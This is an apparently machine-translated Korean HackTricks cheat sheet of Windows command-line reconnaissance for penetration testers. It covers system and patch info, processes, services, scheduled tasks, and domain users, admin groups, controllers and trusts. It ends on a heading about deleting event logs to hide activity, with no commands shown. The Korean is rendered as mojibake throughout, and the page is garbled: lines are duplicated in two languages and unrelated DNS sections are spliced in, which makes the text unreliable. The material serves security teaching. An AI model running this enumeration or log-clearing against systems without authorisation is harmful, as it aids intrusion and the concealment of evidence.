# Basic Win CMD for Pentesters

## ê¸°ë³¸ Win CMD for Pentesters

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ ì œë¡œë¶€í„° AWS í•´í‚¹ì„ ì „ë¬¸ê°€ ìˆ˜ì¤€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

* **ì‚¬ì´ë²„ ë³´ì•ˆ íšŒì‚¬**ì—ì„œ ì¼í•˜ì‹œë‚˜ìš”? **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”**? ì•„ë‹ˆë©´ **PEASSì˜ ìµœì‹  ë²„ì „ì— ì•¡ì„¸ìŠ¤í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•´ë³´ì„¸ìš”!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•´ë³´ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter**ì—ì„œ ì €ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš” ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´ PRì„** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ë°** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ì— ì œì¶œí•˜ì„¸ìš”.**

</details>

### ì‹œìŠ¤í…œ ì •ë³´

#### ë²„ì „ ë° íŒ¨ì¹˜ ì •ë³´

```bash
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get architecture
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic computersystem LIST full #Get PC info

wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic qfe list brief #Updates

hostname

DRIVERQUERY #3rd party driver vulnerable?
```

#### í™˜ê²½

#### Basic CMD commands for pentesters

#### íœí…ŒìŠ¤í„°ë¥¼ ìœ„í•œ ê¸°ë³¸ CMD ëª…ë ¹ì–´

**Networking**

**ë„¤íŠ¸ì›Œí‚¹**

**IP Configuration**

**IP êµ¬ì„±**

* **ipconfig** - Display IP configuration for all network interfaces.
* **ipconfig** - ëª¨ë“  ë„¤íŠ¸ì›Œí¬ ì¸í„°í˜ì´ìŠ¤ì˜ IP êµ¬ì„±ì„ í‘œì‹œí•©ë‹ˆë‹¤.

**Network Connections**

**ë„¤íŠ¸ì›Œí¬ ì—°ê²°**

* **netstat -ano** - Display active network connections and listening ports.
* **netstat -ano** - í™œì„± ë„¤íŠ¸ì›Œí¬ ì—°ê²°ê³¼ ìˆ˜ì‹  ëŒ€ê¸° í¬íŠ¸ë¥¼ í‘œì‹œí•©ë‹ˆë‹¤.

**DNS**

**DNS**

* **nslookup** - Query DNS servers for DNS records.
* **nslookup** - DNS ë ˆì½”ë“œë¥¼ ìœ„í•´ DNS ì„œë²„ì— ì¿¼ë¦¬í•©ë‹ˆë‹¤.

**Ping**

**í•‘**

* **ping** - Send ICMP echo requests to a specific IP address or domain.
* **ping** - íŠ¹ì • IP ì£¼ì†Œ ë˜ëŠ” ë„ë©”ì¸ì— ICMP ì—ì½” ìš”ì²­ì„ ë³´ëƒ…ë‹ˆë‹¤.

**Traceroute**

**Traceroute**

* **tracert** - Determine the route packets take to reach a destination IP address or domain.
* **tracert** - íŒ¨í‚·ì´ ëª©ì ì§€ IP ì£¼ì†Œ ë˜ëŠ” ë„ë©”ì¸ì— ë„ë‹¬í•˜ëŠ” ê²½ë¡œë¥¼ ê²°ì •í•©ë‹ˆë‹¤.

**Netcat**

**Netcat**

* **nc** - Utility for reading from and writing to network connections.
* **nc** - ë„¤íŠ¸ì›Œí¬ ì—°ê²°ì—ì„œ ì½ê³  ì“°ê¸° ìœ„í•œ ìœ í‹¸ë¦¬í‹°ì…ë‹ˆë‹¤.

**System Information**

**ì‹œìŠ¤í…œ ì •ë³´**

**System Information**

**ì‹œìŠ¤í…œ ì •ë³´**

* **systeminfo** - Display detailed configuration information about a computer and its operating system.
* **systeminfo** - ì»´í“¨í„°ì™€ ìš´ì˜ ì²´ì œì— ëŒ€í•œ ìì„¸í•œ êµ¬ì„± ì •ë³´ë¥¼ í‘œì‹œí•©ë‹ˆë‹¤.

**Processes**

**í”„ë¡œì„¸ìŠ¤**

* **tasklist** - Display a list of currently running processes.
* **tasklist** - í˜„ì¬ ì‹¤í–‰ ì¤‘ì¸ í”„ë¡œì„¸ìŠ¤ ëª©ë¡ì„ í‘œì‹œí•©ë‹ˆë‹¤.

**Services**

**ì„œë¹„ìŠ¤**

* **sc query** - Display the status of services on a local or remote machine.
* **sc query** - ë¡œì»¬ ë˜ëŠ” ì›ê²© ì»´í“¨í„°ì˜ ì„œë¹„ìŠ¤ ìƒíƒœë¥¼ í‘œì‹œí•©ë‹ˆë‹¤.

**Event Logs**

**ì´ë²¤íŠ¸ ë¡œê·¸**

* **wevtutil** - Manage event logs from the command line.
* **wevtutil** - ëª…ë ¹ í”„ë¡¬í”„íŠ¸ì—ì„œ ì´ë²¤íŠ¸ ë¡œê·¸ë¥¼ ê´€ë¦¬í•©ë‹ˆë‹¤.

**File System**

**íŒŒì¼ ì‹œìŠ¤í…œ**

**Directory Listing**

**ë””ë ‰í„°ë¦¬ ëª©ë¡**

* **dir** - Display a list of files and subdirectories in a directory.
* **dir** - ë””ë ‰í„°ë¦¬ì˜ íŒŒì¼ê³¼ í•˜ìœ„ ë””ë ‰í„°ë¦¬ ëª©ë¡ì„ í‘œì‹œí•©ë‹ˆë‹¤.

**File Manipulation**

**íŒŒì¼ ì¡°ì‘**

* **copy** - Copy files from one location to another.
* **copy** - íŒŒì¼ì„ í•œ ìœ„ì¹˜ì—ì„œ ë‹¤ë¥¸ ìœ„ì¹˜ë¡œ ë³µì‚¬í•©ë‹ˆë‹¤.
* **move** - Move files from one location to another.
* **move** - íŒŒì¼ì„ í•œ ìœ„ì¹˜ì—ì„œ ë‹¤ë¥¸ ìœ„ì¹˜ë¡œ ì´ë™í•©ë‹ˆë‹¤.
* **del** - Delete files.
* **del** - íŒŒì¼ì„ ì‚­ì œí•©ë‹ˆë‹¤.

**File Permissions**

**íŒŒì¼ ê¶Œí•œ**

* **icacls** - Display or modify file access control lists (ACLs).
* **icacls** - íŒŒì¼ ì•¡ì„¸ìŠ¤ ì œì–´ ëª©ë¡(ACL)ì„ í‘œì‹œí•˜ê±°ë‚˜ ìˆ˜ì •í•©ë‹ˆë‹¤.

**User Accounts**

**ì‚¬ìš©ì ê³„ì •**

**Local Users**

**ë¡œì»¬ ì‚¬ìš©ì**

* **net user** - Display or modify local user accounts.
* **net user** - ë¡œì»¬ ì‚¬ìš©ì ê³„ì •ì„ í‘œì‹œí•˜ê±°ë‚˜ ìˆ˜ì •í•©ë‹ˆë‹¤.

**Local Groups**

**ë¡œì»¬ ê·¸ë£¹**

* **net localgroup** - Display or modify local groups.
* **net localgroup** - ë¡œì»¬ ê·¸ë£¹ì„ í‘œì‹œí•˜ê±°ë‚˜ ìˆ˜ì •í•©ë‹ˆë‹¤.

**User Privileges**

**ì‚¬ìš©ì ê¶Œí•œ**

* **whoami /priv** - Display the privileges of the current user.
* **whoami /priv** - í˜„ì¬ ì‚¬ìš©ìì˜ ê¶Œí•œì„ í‘œì‹œí•©ë‹ˆë‹¤.

**Registry**

**ë ˆì§€ìŠ¤íŠ¸ë¦¬**

**Registry Keys**

**ë ˆì§€ìŠ¤íŠ¸ë¦¬ í‚¤**

* **reg query** - Display the values and subkeys of a registry key.
* **reg query** - ë ˆì§€ìŠ¤íŠ¸ë¦¬ í‚¤ì˜ ê°’ì„ ë° í•˜ìœ„ í‚¤ë¥¼ í‘œì‹œí•©ë‹ˆë‹¤.

**Registry Values**

**ë ˆì§€ìŠ¤íŠ¸ë¦¬ ê°’**

* **reg query** - Display the data for a specific registry value.
* **reg query** - íŠ¹ì • ë ˆì§€ìŠ¤íŠ¸ë¦¬ ê°’ì˜ ë°ì´í„°ë¥¼ í‘œì‹œí•©ë‹ˆë‹¤.

**Registry Modification**

**ë ˆì§€ìŠ¤íŠ¸ë¦¬ ìˆ˜ì •**

* **reg add** - Add a new registry key or value.
* **reg add** - ìƒˆë¡œìš´ ë ˆì§€ìŠ¤íŠ¸ë¦¬ í‚¤ ë˜ëŠ” ê°’ì„ ì¶”ê°€í•©ë‹ˆë‹¤.
* **reg delete** - Delete a registry key or value.
* **reg delete** - ë ˆì§€ìŠ¤íŠ¸ë¦¬ í‚¤ ë˜ëŠ” ê°’ì„ ì‚­ì œí•©ë‹ˆë‹¤.

**Miscellaneous**

**ê¸°íƒ€**

**Task Scheduler**

**ì‘ì—… ìŠ¤ì¼€ì¤„ëŸ¬**

* **schtasks** - Create, modify, or delete scheduled tasks.
* **schtasks** - ì˜ˆì•½ëœ ì‘ì—…ì„ ìƒì„±, ìˆ˜ì • ë˜ëŠ” ì‚­ì œí•©ë‹ˆë‹¤.

**Windows Firewall**

**Windows ë°©í™”ë²½**

* **netsh advfirewall** - Configure Windows Firewall settings.
* **netsh advfirewall** - Windows ë°©í™”ë²½ ì„¤ì •ì„ êµ¬ì„±í•©ë‹ˆë‹¤.

**Windows Updates**

**Windows ì—…ë°ì´íŠ¸**

* **wuauclt** - Control Windows Updates from the command line.
* **wuauclt** - ëª…ë ¹ í”„ë¡¬í”„íŠ¸ì—ì„œ Windows ì—…ë°ì´íŠ¸ë¥¼ ì œì–´í•©ë‹ˆë‹¤.

```bash
set #List all environment variables
```

ë‹¤ìŒì€ ê°•ì¡°í•´ì•¼ í•  ëª‡ ê°€ì§€ í™˜ê²½ ë³€ìˆ˜ì…ë‹ˆë‹¤:

* **COMPUTERNAME**: ì»´í“¨í„°ì˜ ì´ë¦„
* **TEMP/TMP:** ì„ì‹œ í´ë”
* **USERNAME:** ì‚¬ìš©ì ì´ë¦„
* **HOMEPATH/USERPROFILE:** í™ˆ ë””ë ‰í† ë¦¬
* **windir:** C:\Windows
* **OS**: Windows ìš´ì˜ ì²´ì œ
* **LOGONSERVER**: ë„ë©”ì¸ ì»¨íŠ¸ë¡¤ëŸ¬ì˜ ì´ë¦„
* **USERDNSDOMAIN**: DNSì™€ í•¨ê»˜ ì‚¬ìš©í•  ë„ë©”ì¸ ì´ë¦„
* **USERDOMAIN**: ë„ë©”ì¸ì˜ ì´ë¦„

```bash
nslookup %LOGONSERVER%.%USERDNSDOMAIN% #DNS request for DC
```

#### ë§ˆìš´íŠ¸ëœ ë””ìŠ¤í¬

Mounted disks are additional storage devices that have been attached to a computer system and made accessible for use. These disks can be physical devices, such as external hard drives or USB flash drives, or they can be virtual disks created within a virtual machine environment.

ë§ˆìš´íŠ¸ëœ ë””ìŠ¤í¬ëŠ” ì»´í“¨í„° ì‹œìŠ¤í…œì— ì—°ê²°ë˜ì–´ ì‚¬ìš©í•  ìˆ˜ ìˆë„ë¡ ì¶”ê°€ ì €ì¥ ì¥ì¹˜ì…ë‹ˆë‹¤. ì´ ë””ìŠ¤í¬ëŠ” ì™¸ì¥ í•˜ë“œ ë“œë¼ì´ë¸Œë‚˜ USB í”Œë˜ì‹œ ë“œë¼ì´ë¸Œì™€ ê°™ì€ ë¬¼ë¦¬ì  ì¥ì¹˜ì¼ ìˆ˜ë„ ìˆìœ¼ë©°, ê°€ìƒ ë¨¸ì‹  í™˜ê²½ ë‚´ì—ì„œ ìƒì„±ëœ ê°€ìƒ ë””ìŠ¤í¬ì¼ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

```bash
(wmic logicaldisk get caption 2>nul | more) || (fsutil fsinfo drives 2>nul)
wmic logicaldisk get caption,description,providername
```

#### [Defender](authentication-credentials-uac-and-efs/#defender)

#### íœ´ì§€í†µ

```bash
dir C:\$Recycle.Bin /s /b
```

#### í”„ë¡œì„¸ìŠ¤, ì„œë¹„ìŠ¤ ë° ì†Œí”„íŠ¸ì›¨ì–´

**List running processes**

**ì‹¤í–‰ ì¤‘ì¸ í”„ë¡œì„¸ìŠ¤ ëª©ë¡**

To list all running processes on a Windows system, you can use the `tasklist` command in the command prompt.

Windows ì‹œìŠ¤í…œì—ì„œ ì‹¤í–‰ ì¤‘ì¸ ëª¨ë“  í”„ë¡œì„¸ìŠ¤ë¥¼ ë‚˜ì—´í•˜ë ¤ë©´ ëª…ë ¹ í”„ë¡¬í”„íŠ¸ì—ì„œ `tasklist` ëª…ë ¹ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```plaintext
tasklist
```

**List services**

**ì„œë¹„ìŠ¤ ëª©ë¡**

To list all services on a Windows system, you can use the `sc` command in the command prompt.

Windows ì‹œìŠ¤í…œì˜ ëª¨ë“  ì„œë¹„ìŠ¤ë¥¼ ë‚˜ì—´í•˜ë ¤ë©´ ëª…ë ¹ í”„ë¡¬í”„íŠ¸ì—ì„œ `sc` ëª…ë ¹ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```plaintext
sc query
```

**List installed software**

**ì„¤ì¹˜ëœ ì†Œí”„íŠ¸ì›¨ì–´ ëª©ë¡**

To list all installed software on a Windows system, you can use the `wmic` command in the command prompt.

Windows ì‹œìŠ¤í…œì— ì„¤ì¹˜ëœ ëª¨ë“  ì†Œí”„íŠ¸ì›¨ì–´ë¥¼ ë‚˜ì—´í•˜ë ¤ë©´ ëª…ë ¹ í”„ë¡¬í”„íŠ¸ì—ì„œ `wmic` ëª…ë ¹ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```plaintext
wmic product get name,version
```

**Stop a service**

**ì„œë¹„ìŠ¤ ì¤‘ì§€**

To stop a service on a Windows system, you can use the `sc` command with the `stop` parameter in the command prompt.

Windows ì‹œìŠ¤í…œì—ì„œ ì„œë¹„ìŠ¤ë¥¼ ì¤‘ì§€í•˜ë ¤ë©´ ëª…ë ¹ í”„ë¡¬í”„íŠ¸ì—ì„œ `sc` ëª…ë ¹ì„ `stop` ë§¤ê°œë³€ìˆ˜ì™€ í•¨ê»˜ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```plaintext
sc stop <service_name>
```

Replace `<service_name>` with the name of the service you want to stop.

`<service_name>`ì„ ì¤‘ì§€í•˜ë ¤ëŠ” ì„œë¹„ìŠ¤ì˜ ì´ë¦„ìœ¼ë¡œ ëŒ€ì²´í•˜ì„¸ìš”.

**Start a service**

**ì„œë¹„ìŠ¤ ì‹œì‘**

To start a service on a Windows system, you can use the `sc` command with the `start` parameter in the command prompt.

Windows ì‹œìŠ¤í…œì—ì„œ ì„œë¹„ìŠ¤ë¥¼ ì‹œì‘í•˜ë ¤ë©´ ëª…ë ¹ í”„ë¡¬í”„íŠ¸ì—ì„œ `sc` ëª…ë ¹ì„ `start` ë§¤ê°œë³€ìˆ˜ì™€ í•¨ê»˜ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```plaintext
sc start <service_name>
```

Replace `<service_name>` with the name of the service you want to start.

`<service_name>`ì„ ì‹œì‘í•˜ë ¤ëŠ” ì„œë¹„ìŠ¤ì˜ ì´ë¦„ìœ¼ë¡œ ëŒ€ì²´í•˜ì„¸ìš”.

```bash
schtasks /query /fo LIST /v #Verbose out of scheduled tasks
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
tasklist /V #List processes
tasklist /SVC #links processes to started services
net start #Windows Services started
wmic service list brief #List services
sc query #List of services
dir /a "C:\Program Files" #Installed software
dir /a "C:\Program Files (x86)" #Installed software
reg query HKEY_LOCAL_MACHINE\SOFTWARE #Installed software
```

### ë„ë©”ì¸ ì •ë³´

#### Whois

WhoisëŠ” ë„ë©”ì¸ì— ëŒ€í•œ ë“±ë¡ ì •ë³´ë¥¼ ê²€ìƒ‰í•˜ëŠ” ë„êµ¬ì…ë‹ˆë‹¤. ì¼ë°˜ì ìœ¼ë¡œ ë„ë©”ì¸ ì†Œìœ ì, ë“±ë¡ì¼, ë§Œë£Œì¼, ë„¤ì„ì„œë²„ ë“±ì˜ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

```plaintext
whois <ë„ë©”ì¸>
```

#### DNS ì •ë³´

ë„ë©”ì¸ ì´ë¦„ ì‹œìŠ¤í…œ(DNS)ì€ ë„ë©”ì¸ ì´ë¦„ì„ IP ì£¼ì†Œë¡œ ë³€í™˜í•˜ëŠ” ì—­í• ì„ í•©ë‹ˆë‹¤. DNS ì •ë³´ë¥¼ í™•ì¸í•˜ì—¬ ë„ë©”ì¸ì— ì—°ê²°ëœ IP ì£¼ì†Œë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```plaintext
nslookup <ë„ë©”ì¸>
```

#### MX ë ˆì½”ë“œ

MX(Mail Exchanger) ë ˆì½”ë“œëŠ” ë„ë©”ì¸ì— ì—°ê²°ëœ ë©”ì¼ ì„œë²„ì˜ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤. MX ë ˆì½”ë“œë¥¼ í™•ì¸í•˜ì—¬ ë„ë©”ì¸ê³¼ ê´€ë ¨ëœ ë©”ì¼ ì„œë²„ë¥¼ íŒŒì•…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```plaintext
nslookup -type=mx <ë„ë©”ì¸>
```

#### SPF ë ˆì½”ë“œ

SPF(Sender Policy Framework) ë ˆì½”ë“œëŠ” ë„ë©”ì¸ì—ì„œ ë°œì†¡ë˜ëŠ” ì´ë©”ì¼ì„ ì¸ì¦í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤. SPF ë ˆì½”ë“œë¥¼ í™•ì¸í•˜ì—¬ ë„ë©”ì¸ì˜ ì´ë©”ì¼ ì¸ì¦ ì„¤ì •ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```plaintext
nslookup -type=txt <ë„ë©”ì¸>
```

#### Zone Transfer

Zone TransferëŠ” DNS ì„œë²„ì—ì„œ ë„ë©”ì¸ì— ëŒ€í•œ ëª¨ë“  ë ˆì½”ë“œë¥¼ ê°€ì ¸ì˜¤ëŠ” ê³¼ì •ì…ë‹ˆë‹¤. Zone Transferë¥¼ í†µí•´ ë„ë©”ì¸ì— ëŒ€í•œ ìƒì„¸í•œ ì •ë³´ë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```plaintext
nslookup
> server <DNS ì„œë²„>
> ls -d <ë„ë©”ì¸>
```

#### Subdomain

ì„œë¸Œë„ë©”ì¸ì€ ê¸°ì¡´ ë„ë©”ì¸ì˜ í•˜ìœ„ ë„ë©”ì¸ìœ¼ë¡œ, ì„œë¸Œë„ë©”ì¸ ìŠ¤ìºë‹ì„ í†µí•´ ë„ë©”ì¸ì— ì—°ê²°ëœ ëª¨ë“  ì„œë¸Œë„ë©”ì¸ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```plaintext
dnsrecon -d <ë„ë©”ì¸>
```

#### Zone Transfer ë°©ì§€

Zone Transferë¥¼ ë°©ì§€í•˜ê¸° ìœ„í•´ DNS ì„œë²„ëŠ” ë³´ì•ˆ ì„¤ì •ì„ í•´ì•¼ í•©ë‹ˆë‹¤. Zone Transfer ë°©ì§€ë¥¼ ìœ„í•´ ë‹¤ìŒê³¼ ê°™ì€ ì„¤ì •ì„ ì ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

* DNS ì„œë²„ì—ì„œ Zone Transferë¥¼ í—ˆìš©í•˜ì§€ ì•Šë„ë¡ ì„¤ì •
* DNS ì„œë²„ì˜ IP ì£¼ì†Œë¥¼ ì•Œ ìˆ˜ ì—†ë„ë¡ ì„¤ì •
* DNS ì„œë²„ì˜ ì†Œí”„íŠ¸ì›¨ì–´ ë²„ì „ì„ ê°ì¶”ë„ë¡ ì„¤ì •

#### DNSSEC

DNSSEC(Domain Name System Security Extensions)ëŠ” DNSì˜ ë³´ì•ˆì„ ê°•í™”í•˜ëŠ” ê¸°ìˆ ì…ë‹ˆë‹¤. DNSSECë¥¼ ì‚¬ìš©í•˜ì—¬ ë„ë©”ì¸ì˜ DNS ë°ì´í„°ì˜ ë¬´ê²°ì„±ê³¼ ì¸ì¦ì„ ë³´ì¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### ë„ë©”ì¸ ë ˆì§€ìŠ¤íŠ¸ë¦¬

ë„ë©”ì¸ ë ˆì§€ìŠ¤íŠ¸ë¦¬ëŠ” ë„ë©”ì¸ ì´ë¦„ì„ ê´€ë¦¬í•˜ëŠ” ì¡°ì§ì…ë‹ˆë‹¤. ë„ë©”ì¸ ë ˆì§€ìŠ¤íŠ¸ë¦¬ë¥¼ í†µí•´ ë„ë©”ì¸ì— ëŒ€í•œ ì¶”ê°€ ì •ë³´ë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### ë„ë©”ì¸ ë ˆì½”ë“œ

ë„ë©”ì¸ ë ˆì½”ë“œëŠ” ë„ë©”ì¸ì— ëŒ€í•œ ë‹¤ì–‘í•œ ì •ë³´ë¥¼ í¬í•¨í•˜ëŠ” ë°ì´í„°ì…ë‹ˆë‹¤. ë„ë©”ì¸ ë ˆì½”ë“œë¥¼ í™•ì¸í•˜ì—¬ ë„ë©”ì¸ì— ëŒ€í•œ ìƒì„¸í•œ ì •ë³´ë¥¼ íŒŒì•…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```bash
# Generic AD info
echo %USERDOMAIN% #Get domain name
echo %USERDNSDOMAIN% #Get domain name
echo %logonserver% #Get name of the domain controller
set logonserver #Get name of the domain controller
set log #Get name of the domain controller
gpresult /V # Get current policy applied
wmic ntdomain list /format:list	#Displays information about the Domain and Domain Controllers

# Users
dsquery user #Get all users
net user /domain #List all users of the domain
net user <ACCOUNT_NAME> /domain #Get information about that user
net accounts /domain #Password and lockout policy
wmic useraccount list /format:list #Displays information about all local accounts and any domain accounts that have logged into the device
wmic /NAMESPACE:\\root\directory\ldap PATH ds_user GET ds_samaccountname #Get all users
wmic /NAMESPACE:\\root\directory\ldap PATH ds_user where "ds_samaccountname='user_name'" GET # Get info of 1 users
wmic sysaccount list /format:list #Â Dumps information about any system accounts that are being used as service accounts.

# Groups
net group /domain #List of domain groups
net localgroup administrators /domain #List uses that belongs to the administrators group inside the domain (the group "Domain Admins" is included here)
net group "Domain Admins" /domain #List users with domain admin privileges
net group "domain computers" /domain #List of PCs connected to the domain
net group "Domain Controllers" /domain #List PC accounts of domains controllers
wmic group list /format:list # Information about all local groups
wmic /NAMESPACE:\\root\directory\ldap PATH ds_group GET ds_samaccountname #Get all groups
wmic /NAMESPACE:\\root\directory\ldap PATH ds_group where "ds_samaccountname='Domain Admins'" Get ds_member /Value #Members of the group
wmic path win32_groupuser where (groupcomponent="win32_group.name="domain admins",domain="DOMAIN_NAME"") #Members of the group

# Computers
dsquery computer #Get all computers
net view /domain #Lis of PCs of the domain
nltest /dclist:<DOMAIN> #List domain controllers
wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_samaccountname #All computers
wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_dnshostname #All computers

# Trust relations
nltest /domain_trusts #Mapping of the trust relationships

# Get all objects inside an OU
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```

#### ë¡œê·¸ ë° ì´ë²¤íŠ¸

**Windows ì´ë²¤íŠ¸ ë¡œê·¸**

Windows ìš´ì˜ ì²´ì œëŠ” ì‹œìŠ¤í…œ ë° ì• í”Œë¦¬ì¼€ì´ì…˜ ì´ë²¤íŠ¸ì— ëŒ€í•œ ë¡œê·¸ë¥¼ ìœ ì§€í•©ë‹ˆë‹¤. ì´ë²¤íŠ¸ ë¡œê·¸ëŠ” ì‹œìŠ¤í…œ ë¬¸ì œë¥¼ ì§„ë‹¨í•˜ê³  ë³´ì•ˆ ìœ„í˜‘ì„ íƒì§€í•˜ëŠ” ë° ë„ì›€ì´ ë©ë‹ˆë‹¤. ë‹¤ìŒì€ Windows ì´ë²¤íŠ¸ ë¡œê·¸ì˜ ìœ í˜•ì…ë‹ˆë‹¤.

* **Application Log**: ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ë°œìƒí•œ ì´ë²¤íŠ¸ë¥¼ ê¸°ë¡í•©ë‹ˆë‹¤.
* **Security Log**: ë³´ì•ˆ ê´€ë ¨ ì´ë²¤íŠ¸ë¥¼ ê¸°ë¡í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´ ë¡œê·¸ì¸ ì‹œë„, ê³„ì • ì ê¸ˆ ë° ì•”í˜¸ ë³€ê²½ê³¼ ê°™ì€ ì´ë²¤íŠ¸ê°€ í¬í•¨ë©ë‹ˆë‹¤.
* **System Log**: ì‹œìŠ¤í…œ ê´€ë ¨ ì´ë²¤íŠ¸ë¥¼ ê¸°ë¡í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´ í•˜ë“œì›¨ì–´ ì˜¤ë¥˜, ë“œë¼ì´ë²„ ë¬¸ì œ ë° ì„œë¹„ìŠ¤ ì¤‘ì§€ì™€ ê°™ì€ ì´ë²¤íŠ¸ê°€ í¬í•¨ë©ë‹ˆë‹¤.

**ì´ë²¤íŠ¸ ë¡œê·¸ ê²€í† **

ì´ë²¤íŠ¸ ë¡œê·¸ë¥¼ ê²€í† í•˜ì—¬ ì‹œìŠ¤í…œì— ëŒ€í•œ ì •ë³´ë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹¤ìŒì€ ì´ë²¤íŠ¸ ë¡œê·¸ë¥¼ ê²€í† í•˜ëŠ” ëª‡ ê°€ì§€ ìœ ìš©í•œ ëª…ë ¹ì–´ì…ë‹ˆë‹¤.

* **wevtutil**: ì´ë²¤íŠ¸ ë¡œê·¸ë¥¼ ê´€ë¦¬í•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” ëª…ë ¹ì–´ì…ë‹ˆë‹¤. ë¡œê·¸ë¥¼ ë‚´ë³´ë‚´ê±°ë‚˜ ê°€ì ¸ì˜¤ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **eventvwr**: Windows ì´ë²¤íŠ¸ ë·°ì–´ë¥¼ ì—½ë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ì´ë²¤íŠ¸ ë¡œê·¸ë¥¼ ì‹œê°ì ìœ¼ë¡œ ê²€í† í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**ë¡œê·¸ íŒŒì¼ ìœ„ì¹˜**

Windows ì´ë²¤íŠ¸ ë¡œê·¸ íŒŒì¼ì€ ë‹¤ìŒ ìœ„ì¹˜ì— ì €ì¥ë©ë‹ˆë‹¤.

* **Application Log**: C:\Windows\System32\winevt\Logs\Application.evtx
* **Security Log**: C:\Windows\System32\winevt\Logs\Security.evtx
* **System Log**: C:\Windows\System32\winevt\Logs\System.evtx

**ë¡œê·¸ íŒŒì¼ ë¶„ì„**

ë¡œê·¸ íŒŒì¼ì„ ë¶„ì„í•˜ì—¬ ì‹œìŠ¤í…œì— ëŒ€í•œ ì •ë³´ë¥¼ ì¶”ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹¤ìŒì€ ë¡œê·¸ íŒŒì¼ì„ ë¶„ì„í•˜ëŠ” ëª‡ ê°€ì§€ ìœ ìš©í•œ ë„êµ¬ì…ë‹ˆë‹¤.

* **Event Log Explorer**: Windows ì´ë²¤íŠ¸ ë¡œê·¸ë¥¼ ë¶„ì„í•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” ê°•ë ¥í•œ ë„êµ¬ì…ë‹ˆë‹¤.
* **LogParser**: ë¡œê·¸ íŒŒì¼ì„ ì¿¼ë¦¬í•˜ê³  ë¶„ì„í•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” ëª…ë ¹ì¤„ ë„êµ¬ì…ë‹ˆë‹¤.

**ë¡œê·¸ íŒŒì¼ ì‚­ì œ**

ë¡œê·¸ íŒŒì¼ì„ ì‚­ì œí•˜ì—¬ ì‹œìŠ¤í…œì—ì„œ ë°œìƒí•œ í™œë™ì„ ìˆ¨ê¸¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹¤ìŒì€ ë¡œê·¸ íŒŒì¼ì„ ì‚­ì œí•˜ëŠ” ëª‡ ê°€ì§€ ìœ ìš©í•œ ëª…ë ¹ì–´ì…ë‹ˆë‹¤.

